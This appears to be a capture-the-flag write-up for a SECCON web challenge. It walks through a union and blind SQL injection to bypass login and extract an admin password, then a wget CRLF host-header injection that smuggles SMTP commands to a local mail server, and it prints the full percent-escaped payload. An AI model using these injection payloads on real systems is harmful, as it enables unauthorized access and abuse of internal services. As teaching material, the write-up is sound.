# sqlsrf (web, 400p)

```
the root reply the flag to your mail address if you send a mail that subject is "give me flag" to root.
```

in the task initially we get access to a login screen and [source code of the index page](index.pl]).
first goal is to somehow login into the system.

in the sources we can see:

```perl
if($q->param('login') ne '') {
  use dbi;
  my $dbh = dbi->connect('dbi:sqlite:dbname=./.htdb');
  my $sth = $dbh->prepare("select password from users where username='".$q->param('user')."';");
  $errmsg = '<h2 style="color:red">login error!</h2>';
  eval {
    $sth->execute();
    if(my @row = $sth->fetchrow_array) {
      if($row[0] ne '' && $q->param('pass') ne '' && $row[0] eq &encrypt($q->param('pass'))) {
        $s->param('autheduser', $q->param('user'));
        print "<scr"."ipt>document.location='./menu.cgi';</script>";
        $errmsg = '';
      }
    }
  };
  if($@) {
    $errmsg = '<h2 style="color:red">database error!</h2>';
  }
  $dbh->disconnect();
```

there is a clear sqlinjection in the query which is supposed to retrieve the password for given user from the database.
the password is then compared with `&encrypt($q->param('pass'))`.
we can easily inject any password simply by providing username `whateve' union select 'our_password` but we need to know the encrypted form of `our_password` for this to work.
fortunately we can see in the code also:

```perl
my $user = $q->param('user');
//
($q->param('save') eq '1' ? $q->cookie(-name=>'remember', -value=>&encrypt($user), -expires=>'+1m') : undef)
```

if we put username and select "remember me" checkbox, the system will automatically create the cookie with encrypted username.
we can then first put `our_password` as username, select "remember me", click login and retrieve the encrypted string from the cookie.

once we manage to login into th system it turns out it's no good because as non-admin user we can only use `netstat` command and we can't use `wget`:


[image extracted text: active  internet connect ions (only
servers)
proto recv
send
oca
add
ess
foreign address
state
tcp
isten
tcp
listen
tcp
27
0.0_
25
listen
tcpb
22
listen
tcp6
:25
listen
netstat
tnl
wget -debug
0 /devlstdout 'http: | /
2017.seccon jpl
no.2 is only for "admin" user:]


netstat at least shows that there is smtp server running there, and the task description says we need to use it to send email to root.

it seems we actually need to login as admin, because right now the system remembers exactly what username we put, and we're logged in as `whateve' union select ...` and not as `admin`.
first step is to retrieve the admin password from database.
this we can do via blind sqlinjection in the login screen.
we can't get any echo from the database but we can either login or not login, and we can use this as boolean oracle.
so we can do injection in the form `whatever' union select 'our_encrypted_password' where (condition) and '1'='1`.
the `condition` here is simply a check on the characters of admin password.

after a moment we get back: `d2f37e101c0e76bcc90b5634a5510f64`.
now we need to decrypt this password.
it turns out there is an interesting code on the page:

```perl
$user = &decrypt($q->cookie('remember')) if($user eq '' && $q->cookie('remember') ne '');
//
$user = $q->escapehtml($user);
//
<tr><td>username:</td><td><input type="text" name="user" value="$user"></td></tr>
```

the page actually takes encrypted string from `remember` cookie, decrypts and puts in the `login` field of the form.
it means we can simply place the recovered password in the cookie, and the page will decrypt it for us.
this way we learn that admin password is `yes!kusomon!!`.

now we're back in the system, this time as admin, and we can run `wget`.
sadly we can't really change neither of the commands and no command injection tricks work, we can only use what is provided.
we have to use `wget` to send an email!

smtp and ftp servers are often very permissive when it comes to accepting commands.
they simply ignore incorrect commands and execute correct ones.
what `wget` sends to the designated host is:

```
get / http/1.1
user-agent: wget/1.14 (linux-gnu)
accept: */*
host: 127.0.0.1
connection: keep-alive
```

and smtp server will simply claim that those are all incorrect commands.

we've noticed that `wget` version was outdated, so maybe there is some vulnerability we could use.
some googling brought us to https://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html and this was exactly what we needed.
it turns out we can use newlines and line feeds to modify `host` header and append additional elements there.
we need to add:

```
helo 127.0.0.1
mail from:<shalom@p4.team>
rcpt to:<root@ymzk01.pwn>
data
from: shalom@p4.team
to: root@ymzk01.pwn
subject: give me flag
.
quit
```

so we prepared the payload (with percent escapes):

```
127.0.0.1%0d%0atest%3a %0ahelo 127.0.0.1%0amail from%3a%3cshalom%40p4.team%3e%0arcpt to%3a%3croot%40ymzk01.pwn%3e%0adata%0afrom%3a shalom%40p4.team%0ato%3a root%40ymzk01.pwn%0asubject%3a give me flag%0d%0a.%0d%0a%0aquit%0a:25
```

and we got:


[image extracted text: equest
in--
get
http
user-agent
wget/1.14
inux-gnu)
accept
host
[127.0.0.1
test
he
0 127.0.0_
ma
om: <sha
team}
cpt
to:<roote
tayozkbt:
pwn
data
rom: sha lomlp4. team
to:
oot@ymzko1
pwn
subject
ve
me
]:25
connect ion: keep-al ive
equest
end--
http
request sent
awa
esponse
esponse
in--=
esponse end
200 no headers
assuming http/0.9
registered socket
for persistent
reuse
ength:
unspec
ed
saving
to
/dev/stdout
ymzi
pwn
smtp
patched-postfix
ror
command not
ecognized
ror
command not
ecogn
zed
ror
command
not
ecogn
zed
ror
command not
ecogn
zed
ror
ommand not
ecognized
pwn
end data
with <crx<lf> . <crx<lf>
2.0
queued
as 430e426670
5.5 _
error
bad
syntax
22
2.0.0 bye
beg"
lag
ing
beg]


and right after that we've received the flag, encrypted again with the same encryption as passwords.
so we used the remember cookie trick again and finally recovered the flag: `seccon{ssrfismyfriend!}`
